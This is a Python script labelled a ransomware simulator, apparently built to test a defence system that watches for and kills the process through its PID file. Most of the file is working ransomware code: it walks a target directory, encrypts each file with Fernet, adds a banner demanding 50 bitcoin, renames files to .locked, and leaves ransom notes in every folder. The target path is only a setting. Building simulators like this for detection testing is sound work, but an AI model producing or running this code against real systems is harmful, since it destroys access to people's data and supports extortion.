import os
import time
import argparse
import signal
import sys
from cryptography.fernet import Fernet

# ─── Import shared config ─────────────────────────────────────────────────────
try:
    from config import TEST_DIR, PID_FILE, KEY_FILE
except ImportError:
    # fallback for solo testing before config.py exists
    TEST_DIR = "./test_env/files"
    PID_FILE = "./test_env/ransomware.pid"
    KEY_FILE = "./test_env/encryption.key"

RANSOM_NOTE = """!!! YOUR FILES HAVE BEEN ENCRYPTED !!!

To recover your data, you must pay the ransom immediately.
Do not attempt to modify the .locked files or they will be permanently corrupted.
"""

RANSOM_BANNER = b"""!!! YOUR FILES HAVE BEEN ENCRYPTED BY CANARY RANSOMWARE !!!

Your documents, photos, databases, and other important files have been encrypted
with the strongest military-grade encryption algorithm.

To recover your data, you must pay 50 BITCOIN immediately.
If you attempt to tamper with this file, the key will be destroyed forever.

-----BEGIN ENCRYPTED DATA-----
"""


def handle_sigterm(sig, frame):
    print("\n[RANSOMWARE] Process terminated by defence system.")
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
    except Exception:
        pass
    sys.exit(0)

# ─── Write your PID to a file ─────────────────────────────────────────────────
def announce_myself():
    my_pid = os.getpid()
    os.makedirs(os.path.dirname(PID_FILE), exist_ok=True)
    with open(PID_FILE, "w") as f:
        f.write(str(my_pid))
    signal.signal(signal.SIGTERM, handle_sigterm)
    print(f"[RANSOMWARE] Started. My PID is {my_pid}. Written to {PID_FILE}")


# ─── Generate or load encryption key ──────────────────────────────────────────
def get_key():
    os.makedirs(os.path.dirname(KEY_FILE), exist_ok=True)
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(key)
        return key


# ─── Encrypt a single file ────────────────────────────────────────────────────
def encrypt_file(filepath, fernet):
    if filepath.endswith(".locked"):
        print(f"[SKIP] Already locked: {filepath}")
        return False
    
    try:
        with open(filepath, "rb") as f:
            original_data = f.read()

        encrypted_data = fernet.encrypt(original_data)

        with open(filepath, "wb") as f:
            f.write(RANSOM_BANNER + encrypted_data)

        locked_path = filepath + ".locked"
        os.rename(filepath, locked_path)

        print(f"[ENCRYPTED] {filepath} -> {locked_path}")
        return True

    except Exception as e:
        print(f"[ERROR] Could not encrypt {filepath}: {e}")
        return False


# ─── Walk the directory and encrypt everything ────────────────────────────────
def run_encryption(delay_ms):
    key = get_key()
    fernet = Fernet(key)
    delay_seconds = delay_ms / 1000.0

    encrypted_count = 0
    skipped_count = 0

    print(f"[RANSOMWARE] Scanning {TEST_DIR} ...")

    for root, dirs, files in os.walk(TEST_DIR):
        dirs.sort()

        # Drop ransom note in every directory
        note_path = os.path.join(root, "README_DECRYPT.txt")
        try:
            with open(note_path, "w") as f:
                f.write(RANSOM_NOTE)
        except Exception:
            pass

        for filename in sorted(files):

            if filename == os.path.basename(KEY_FILE) or filename == "ransomware.pid" or filename == "README_DECRYPT.txt":
                continue

            full_path = os.path.join(root, filename)
            success = encrypt_file(full_path, fernet)

            if success:
                encrypted_count += 1
            else:
                skipped_count += 1

            if success:
                time.sleep(delay_seconds)

    print(f"\n[RANSOMWARE] Done. Encrypted: {encrypted_count}, Skipped: {skipped_count}")

    # Cleanup PID file after completion
    try:
        if os.path.exists(PID_FILE):
            os.remove(PID_FILE)
            print("[RANSOMWARE] PID file cleaned up.")
    except Exception as e:
        print(f"[WARNING] Could not remove PID file: {e}")


# ─── Main entry point ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ransomware Simulator (demo only)")
    parser.add_argument(
        "--delay",
        type=int,
        default=300,
        help="Delay in milliseconds between encrypting each file (default: 300)"
    )
    args = parser.parse_args()

    announce_myself()
    run_encryption(args.delay)
